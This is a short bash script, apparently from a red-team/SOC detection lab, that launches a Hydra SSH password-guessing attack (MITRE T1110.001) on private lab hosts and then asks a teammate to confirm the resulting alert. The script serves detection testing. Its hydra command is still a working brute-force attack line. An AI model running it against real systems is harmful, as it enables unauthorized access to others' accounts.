#!/bin/bash
# ==============================================================================
# Script: 01_ssh_bruteforce.sh
# MITRE ATT&CK: T1110.001 - Password Guessing
# Target: Web-Server (10.10.10.30) or SOC-Server (10.10.10.10)
# ==============================================================================

TARGET_IP="${1:-10.10.10.30}"
TARGET_USER="${2:-ubuntu}"
PASSWORDS_FILE="wordlists/passwords.txt"

BLUE='\033[0;34m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}====================================================${NC}"
echo -e "${YELLOW}[!] RED TEAM ATTACK SIMULATION: MITRE T1110.001${NC}"
echo -e "${BLUE}====================================================${NC}"
echo -e "[*] Attack Type     : SSH Password Guessing (Brute Force)"
echo -e "[*] Target Host     : ${TARGET_IP}"
echo -e "[*] Target User     : ${TARGET_USER}"
echo -e "[*] Passwords File  : ${PASSWORDS_FILE}"
echo -e "[*] Expected Alert  : High volume of 'Failed password' in /var/log/auth.log"
echo -e "${BLUE}====================================================${NC}"

if [ ! -f "$PASSWORDS_FILE" ]; then
    echo -e "${RED}[ERROR] Wordlist $PASSWORDS_FILE not found!${NC}"
    exit 1
fi

echo -e "\n${GREEN}[+] Launching Hydra SSH brute-force attack...${NC}\n"
hydra -l "$TARGET_USER" -P "$PASSWORDS_FILE" ssh://"$TARGET_IP" -t 4 -V -I

echo -e "\n${BLUE}====================================================${NC}"
echo -e "${GREEN}[✔] Simulation completed.${NC}"
echo -e "[*] Inform Member 1 to verify alert: MITRE T1110.001 on the SOC Dashboard."
echo -e "${BLUE}====================================================${NC}"
